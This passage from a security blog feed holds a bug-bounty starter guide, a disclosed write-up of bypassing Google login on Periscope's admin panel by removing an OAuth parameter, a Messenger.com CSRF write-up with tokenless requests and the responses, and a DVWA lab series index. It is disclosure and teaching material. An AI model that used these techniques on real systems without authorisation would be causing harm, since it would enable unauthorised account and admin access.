  &lt;li&gt;&lt;a href="http://stephensclafani.com/"&gt;Stephen Sclafani&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://insertco.in/articles"&gt;Christian Lopez&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://josipfranjkovic.blogspot.co.uk/"&gt;Josip Franjković&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://olivierbeg.nl/"&gt;Oliver Beg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="toolset"&gt;Toolset&lt;/h4&gt;
&lt;p&gt;I’ll admit, I don’t use many tools, a lot of the time I’ll write a quick PHP/Python script. I should, it’d make my sessions more efficient, but these are the core ones I use all the time.&lt;/p&gt;

&lt;p&gt;One thing to note is that automated scanners (such as Acunetix or Nikto) generate &lt;strong&gt;a lot&lt;/strong&gt; of noise. Most programmes forbid the use of them for this reason. Plus you’re highly unlikely to find something with such a scanner that no one else has found.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href="http://portswigger.net/burp/"&gt;Burp Suite&lt;/a&gt; - An intercepting proxy which lets you modify requests on the fly, replay requests and so on.&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://nmap.org/"&gt;Nmap&lt;/a&gt; - Useful for finding additional web servers to investigate (providing the scope of the programme is wide enough)&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://code.google.com/p/dns-discovery/"&gt;DNS-Discovery&lt;/a&gt; - Find additional sub-domains to investigate&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="intentionally-vulnerable-applications"&gt;Intentionally Vulnerable Applications&lt;/h4&gt;
&lt;p&gt;Applications/systems which have vulnerabilities added to them are a fun way of testing out some techniques. You might find pages outputting user data without escaping (leading to XSS), or code which executes SQL queries in an insecure manner (leading to SQL Injection).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href="http://www.dvwa.co.uk/"&gt;Damn Vulnerable Web App&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://vulnhub.com/"&gt;VulnHub&lt;/a&gt; (Not all of these are web applications)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="programmes"&gt;Programmes&lt;/h4&gt;
&lt;p&gt;There are a lot of sites running a responsible disclosure programme now. The big ones are &lt;a href="https://www.facebook.com/whitehat"&gt;Facebook&lt;/a&gt;, &lt;a href="https://www.google.co.uk/about/appsecurity/reward-program/"&gt;Google&lt;/a&gt;, &lt;a href="https://hackerone.com/yahoo"&gt;Yahoo&lt;/a&gt; and &lt;a href="https://www.paypal.com/uk/webapps/mpp/ebayincbugbounty-tc"&gt;PayPal&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you start looking for bugs on the above sites you might be looking for a good week or two without finding anything, since they’ve been around for a while. One option is to find a smaller site or a new bounty, which probably won’t have had as many people looking at it.&lt;/p&gt;

&lt;p&gt;A good tip is to signup for one of the many sites which host bounties on behalf of other companies. This lets you submit reports in a common format and track the progress - easier than emailing for updates.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://bugcrowd.com/"&gt;Bugcrowd&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.crowdcurity.com"&gt;CrowdCurity&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://hackerone.com"&gt;HackerOne&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.synack.com/"&gt;Synack&lt;/a&gt; (You do need to apply and pass a test to join)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="reporting"&gt;Reporting&lt;/h4&gt;
&lt;p&gt;When submitting a bug, you need to realise that different companies have different time frames for triaging and patching issues. Combined with the volume of reports, you may have to wait a few days/a week for a response. If you first language isn’t English, then it might be wise to submit a short video explaining it.&lt;/p&gt;

&lt;p&gt;Don’t be afraid to send in a report, but you’ll have to understand that the severity and impact that you think the bug has could be very different to how the security team views it. As time goes on, you’ll get a feel for what is an issue and what isn’t.&lt;/p&gt;

&lt;p&gt;Facebook has &lt;a href="https://www.facebook.com/notes/facebook-bug-bounty/commonly-submitted-false-positives/744066222274273"&gt;compiled a list&lt;/a&gt; of the most common false-positives reported.&lt;/p&gt;


    &lt;p&gt;&lt;a href="https://whitton.io/articles/bug-bounties-101-getting-started/"&gt;Bug Bounties 101 - Getting Started&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on July 29, 2014.&lt;/p&gt;</description><pubDate>Mon, 28 Jul 2014 23:00:00 +0000</pubDate></item><item><title>Bypassing Google Authentication on Periscope's Administration Panel</title><link>https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/</link><description>&lt;p&gt;I haven’t blogged for quite some time, so I thought it was worth re-launching with an interesting, albeit simple, high-impact bug.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.periscope.tv/"&gt;Periscope&lt;/a&gt; is an iOS/Android app, owned by Twitter, used for live streaming. To manage the millions of users, a web-based administation panel is used, accessible at &lt;a href="https://admin.periscope.tv"&gt;admin.periscope.tv&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;When you browse to the site, all requests are redirected to &lt;code&gt;/auth?redirect=/&lt;/code&gt; (since we don’t have a valid session), which in turn redirects to &lt;a href="https://developers.google.com/identity/protocols/OpenIDConnect"&gt;Google for authentication&lt;/a&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/periscope/periscope-admin-panel-1.png"&gt;
        &lt;img src="https://whitton.io/images/periscope/periscope-admin-panel-1.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;The redirected URL, shown below, contains various parameters, but the most interesting one is &lt;code&gt;hd&lt;/code&gt;. This is used to &lt;a href="https://developers.google.com/identity/protocols/OpenIDConnect#hd-param"&gt;restrict logins to a specific domain&lt;/a&gt;, in this case &lt;code&gt;bountyapp.co&lt;/code&gt;.&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
https://accounts.google.com/o/oauth2/auth?access_type=
&amp;amp;approval_prompt=
&amp;amp;client_id=57569323683-c0hvkac6m15h3u3l53u89vpquvjiu8sb.apps.googleusercontent.com
&lt;strong&gt;&amp;amp;hd=bountyapp.co&lt;/strong&gt;
&amp;amp;redirect_uri=https%3A%2F%2Fadmin.periscope.tv%2Fauth%2Fcallback
&amp;amp;response_type=code
&amp;amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile
&amp;amp;state=%2FStreams
    &lt;/pre&gt;
&lt;/figure&gt;

&lt;p&gt;If we try and login with an account such as &lt;code&gt;test@gmail.com&lt;/code&gt;, we’re redirected back to the account selection page, and if we try again we get redirected back to the same place, and so on.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/periscope/periscope-admin-panel-2.png"&gt;
        &lt;img src="https://whitton.io/images/periscope/periscope-admin-panel-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;However, we can simply remove this parameter. There’s no signature in the URL to prevent us from making modifications, and as indicated in the documentation, the onus is on the application to validate the returned token.&lt;/p&gt;

&lt;p&gt;This gives us the following login URL (you may also notice I’ve removed the Google+ scope, this is purely because my test account isn’t signed up for it):&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
https://accounts.google.com/o/oauth2/auth?access_type=
&amp;amp;approval_prompt=
&amp;amp;client_id=57569323683-c0hvkac6m15h3u3l53u89vpquvjiu8sb.apps.googleusercontent.com
&amp;amp;redirect_uri=https%3A%2F%2Fadmin.periscope.tv%2Fauth%2Fcallback
&amp;amp;response_type=code
&amp;amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile
&amp;amp;state=%2FStreams
    &lt;/pre&gt;
&lt;/figure&gt;

&lt;p&gt;Browsing to this new URL prompts us to authorise the application.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/periscope/periscope-admin-panel-3.png"&gt;
        &lt;img src="https://whitton.io/images/periscope/periscope-admin-panel-3.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;After clicking “Accept”, a redirect is issused back to the administation panel, with our code as a parameter.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/periscope/periscope-admin-panel-4.png"&gt;
        &lt;img src="https://whitton.io/images/periscope/periscope-admin-panel-4.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;This is where the application should then exchange the code for an access token, and validate the returned user ID against either a whitelist, or at the very least verify that the domain is &lt;code&gt;bountyapp.co&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But, in this case, the assumption is made that if you managed to login, you are an employee with an &lt;code&gt;@bountyapp.co&lt;/code&gt; email.&lt;/p&gt;

&lt;p&gt;The requested &lt;code&gt;&lt;a href="https://developers.google.com/+/web/api/rest/oauth#userinfo.profile"&gt;userinfo.profile&lt;/a&gt;&lt;/code&gt; permission doesn’t contain the user’s email address, so the application can’t validate it if it tried.&lt;/p&gt;

&lt;p&gt;This then presents us with the admin panel.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/periscope/periscope-admin-panel-5.png"&gt;
        &lt;img src="https://whitton.io/images/periscope/periscope-admin-panel-5.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;From here we can now manage various aspects of Periscope, including users and streams.&lt;/p&gt;

&lt;h4 id="fix"&gt;Fix&lt;/h4&gt;

&lt;p&gt;Twitter fixed this by making two changes. The first is to request an additional permission:&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
https://www.googleapis.com/auth/userinfo.email
    &lt;/pre&gt;
&lt;/figure&gt;

&lt;p&gt;The second is to correctly validate the user on callback.&lt;/p&gt;

&lt;p&gt;Now, the application returns a 401 when trying to authenticate with an invalid user:&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Location: /Login
Strict-Transport-Security: max-age=31536000; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Xss-Protection: 1; mode=block
Content-Length: 36

&amp;lt;href="/Login"&amp;gt;Unauthorized&amp;lt;/a&amp;gt;.
    &lt;/pre&gt;
&lt;/figure&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/"&gt;Bypassing Google Authentication on Periscope's Administration Panel&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on July 20, 2015.&lt;/p&gt;</description><pubDate>Sun, 19 Jul 2015 23:00:00 +0000</pubDate></item><item><title>Messenger.com Site-Wide CSRF</title><link>https://whitton.io/articles/messenger-site-wide-csrf/</link><description>&lt;p&gt;&lt;em&gt;I originally wasn’t going to publish this, but &lt;a href="https://twitter.com/phwd"&gt;@phwd&lt;/a&gt; wanted to hear about some of my recent bugs so this post is dedicated to him.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This issue was also found by &lt;a href="https://twitter.com/mazen160"&gt;@mazen160&lt;/a&gt;, who &lt;a href="http://blog.mazinahmed.net/2015/06/facebook-messenger-multiple-csrf.html"&gt;blogged about it&lt;/a&gt; back in June.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;When &lt;a href="https://www.messenger.com"&gt;Messenger.com&lt;/a&gt; launched back in April, I quickly had a look for any low-hanging fruit.&lt;/p&gt;

&lt;p&gt;One of the first things to do is check end-points for &lt;a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery"&gt;Cross-Site Request Forgery&lt;/a&gt; issues. This is whereby an attacker can abuse the fact that cookies are implicity sent with a request (regardless of where the request is made from), and perform actions on another users behalf, such as sending a message or updating a status.&lt;/p&gt;

&lt;p&gt;There are different ways of mitigating this (with varying results), but usually this is achieved by sending a non-guessable token with each request, and comparing it to a value stored server-side/decrypting it and verifying the contents.&lt;/p&gt;

&lt;p&gt;The way I normally check for these is as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Perform the request without modifying the parameters, so we can see what the expected result is&lt;/li&gt;
  &lt;li&gt;Remove the CSRF token completely (in this case, the &lt;code&gt;fb_dtsg&lt;/code&gt; parameter)&lt;/li&gt;
  &lt;li&gt;Modify one of the characters in the token (but keep the length the same)&lt;/li&gt;
  &lt;li&gt;Remove the value of the token (but leave the parameter in place)&lt;/li&gt;
  &lt;li&gt;Convert to a GET request&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If any of the above steps produce the same result as #1 then we know that the end-point is likely to be vulnerable (there are &lt;em&gt;some&lt;/em&gt; instances where you might get a successful response, but in fact no data has been modified and therefore the token hasn’t been checked).&lt;/p&gt;

&lt;p&gt;Normally, on Faceboook, the response is one of two, depending on if the request is an AJAX request or not (indicated by the &lt;code&gt;__a&lt;/code&gt; parameter).&lt;/p&gt;

&lt;p&gt;Either a redirect to &lt;code&gt;/common/invalid_request.php&lt;/code&gt;:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/messengercsrf/messenger-csrf-1.png"&gt;
        &lt;img src="https://whitton.io/images/messengercsrf/messenger-csrf-1.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Or an error message:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/messengercsrf/messenger-csrf-2.png"&gt;
        &lt;img src="https://whitton.io/images/messengercsrf/messenger-csrf-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;I submitted the following request to change the &lt;code&gt;sound_enabled&lt;/code&gt; setting, without &lt;code&gt;fb_dtsg&lt;/code&gt;:&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-text"&gt;POST /settings/edit/ HTTP/1.1
Host: www.messenger.com
Content-Type: application/x-www-form-urlencoded

settings[sound_enabled]=false&amp;amp;__a=1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Which surprisingly gave me the following response:&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-text"&gt;HTTP/1.1 200 OK
Content-Type: application/x-javascript; charset=utf-8
Content-Length: 3559

for (;;);{"__ar":1,"payload":[],"jsmods":{"instances":[["m_a_0",["MarketingLogger"],[null,{"is_mobile":false,"controller_name":"XMessengerDotComSettingsEditController"
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I tried another end-point, this time to remove a user from a group thread.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-text"&gt;POST /chat/remove_participants/?uid=100...&amp;amp;tid=153... HTTP/1.1
Host: www.messenger.com
Content-Type: application/x-www-form-urlencoded

__a=1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Which &lt;em&gt;also&lt;/em&gt; worked:&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-text"&gt;HTTP/1.1 200 OK
Content-Type: application/x-javascript; charset=utf-8
Content-Length: 136

for (;;);{"__ar":1,"payload":null,"domops":[["replace","^.fbProfileBrowserListItem",true,null]],"bootloadable":{},"ixData":{},"lid":"0"}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After trying one more I realised that the check was missing on &lt;strong&gt;every&lt;/strong&gt; request.&lt;/p&gt;

&lt;h4 id="fix"&gt;Fix&lt;/h4&gt;

&lt;p&gt;Simple and quick fix - tokens are now properly checked on every request.&lt;/p&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/messenger-site-wide-csrf/"&gt;Messenger.com Site-Wide CSRF&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on July 26, 2015.&lt;/p&gt;</description><pubDate>Sat, 25 Jul 2015 23:00:00 +0000</pubDate></item><item><title>Damn Vulnerable Web Application (DVWA)</title><link>https://blog.g0tmi1k.com/dvwa/index/</link><description>&lt;p&gt;This is a &lt;a href="https://blog.g0tmi1k.com/dvwa/"&gt;SERIES of blog posts&lt;/a&gt;, which will all relate to one another, &lt;strong&gt;but will take time&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;I'm publishing as I go, but will come back and edit them in places at a later date - as well as adding in videos.&lt;/p&gt;

&lt;p&gt;Best to check back when there is the &lt;strong&gt;"Undocumented" Bugs/Vulnerabilities&lt;/strong&gt; post (&lt;strong&gt;that will be the last post&lt;/strong&gt;!) ;-).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The following posts will demonstrate &lt;strong&gt;various environments, scenarios and setups&lt;/strong&gt;. This will cover a mixture of Operating Systems (&lt;strong&gt;Linux &amp;amp; Windows&lt;/strong&gt;), range of web servers (&lt;strong&gt;Apache, Nginx &amp;amp; IIS&lt;/strong&gt;), different versions of PHP (v5.4 &amp;amp; v5.6), databases (MySQL &amp;amp; MariaDB) as well as user permissions (inside the services and also the ones running services on the OS itself).
DVWA also comes with a (outdated) &lt;strong&gt;Web Application Firewall (WAF)&lt;/strong&gt; called PHP-IDS, which also has its own issues with!
Lastly, there are &lt;strong&gt;"undocumented" vulnerabilities&lt;/strong&gt; with DVWA's core which are either hidden bugs and/or unintended issues...&lt;/p&gt;

&lt;p&gt;&lt;img alt="DVWA Logo" class="center" src="https://blog.g0tmi1k.com/images/dvwa-logo.png" title="DVWA Logo" /&gt;&lt;/p&gt;

&lt;!--more--&gt;


&lt;p&gt;&lt;em&gt;Note: This list will be updated with links, over the next few weeks - once they have been published!&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;Login - &lt;em&gt;HTTP POST form brute force with CSRF token&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Brute Force&lt;/strong&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;Low - &lt;em&gt;HTTP GET form brute force&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;Medium - &lt;em&gt;HTTP GET form brute force with time delays&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;High - &lt;em&gt;HTTP GET form brute force with anti-CSRF token)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Command Injection&lt;/strong&gt; (RCE)

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/rce-low/"&gt;Low - &lt;em&gt;Remote Code Execution&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(Bypassing blacklist patterns)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(Bypassing more blacklist filters)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;Cross-Site Request Forgery&lt;/strong&gt; (CSRF)&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(CSRF)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(Referer header check. Links with XSS module)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(Anti-CSRF token used. Links with XSS module)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;File Inclusion&lt;/strong&gt; (LFI/RFI)&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(LFI &amp;amp; RFI)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(Blacklisting patterns)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(Whitelisting with wildcards)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;File Upload&lt;/strong&gt; (FU)&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(File Upload)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(Spoofed upload type)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(Merged image. Links with LFI module)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;Insecure CAPTCHA&lt;/strong&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(CAPTCHA bypass)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(CAPTCHA bypass by using an extra field)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(Hardcoded/debug values)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt; (SQLi)&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(SQLi)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(&lt;code&gt;mysql_real_escape_string&lt;/code&gt;bypass - unable to use single/double quotes. POST requests in a dropdown menu)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(SQLi in SESSION carried over from another page)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt; (SQLi) &lt;strong&gt;Blind&lt;/strong&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(SQLi)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(&lt;code&gt;mysql_real_escape_string&lt;/code&gt; bypass - unable to use single/double quotes. POST requests in a dropdown menu)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(SQLi in cookie value)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;Cross Site Scripting&lt;/strong&gt; (XSS) &lt;strong&gt;Reflected&lt;/strong&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(XSS)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(XSS filter to remove &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(XSS filter to remove &lt;code&gt;&amp;lt;*s*c*r*i*p*t&lt;/code&gt;)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Phishing&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;Cross Site Scripting&lt;/strong&gt; (XSS) &lt;strong&gt;Stored&lt;/strong&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Low &lt;em&gt;(XSS)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Medium &lt;em&gt;(XSS filter to remove &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;. Limited input size)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;High &lt;em&gt;(XSS filter to remove &lt;code&gt;&amp;lt;*s*c*r*i*p*t&lt;/code&gt;. Limited input size)&lt;/em&gt;&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Impossible&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;PHPIDS (WAF)&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Phishing&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;strong&gt;"Undocumented" Vulnerabilities&lt;/strong&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;Login &lt;em&gt;(HTTP POST form brute force with CSRF token)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Core&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;&lt;del&gt;LFI&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;XSS&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Brute Force &amp;amp; SQLi&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;File Inclusion (LFI/RFI) &amp;amp; XSS&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Targets"&gt;&lt;/a&gt;
&lt;h2&gt;Targets&lt;/h2&gt;

&lt;p&gt;Going to use a mixture of targets:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;4x Operating Systems (Arch Linux, Raspbian Jessie, Windows Server 2012 &amp;amp; Windows XP)&lt;/li&gt;
&lt;li&gt;2x Apaches (One Windows &amp;amp; One Linux)&lt;/li&gt;
&lt;li&gt;2x Windows (One Apache &amp;amp; One IIS)&lt;/li&gt;
&lt;li&gt;2x Linux (One Apache &amp;amp; One Nginx)&lt;/li&gt;
&lt;li&gt;2x Raspberry Pis "B" (One v1 &amp;amp; One v2)&lt;/li&gt;
&lt;li&gt;2x Virtual Machines&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt; &lt;code&gt;192.168.1.11&lt;/code&gt; (aka: ArchPi)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;Raspberry Pi v1 "B"&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Nginx v1.8.0&lt;/strong&gt; &lt;em&gt;(as "httpd")&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.14&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MariaDB v10.0.21&lt;/strong&gt;&lt;/li&gt;
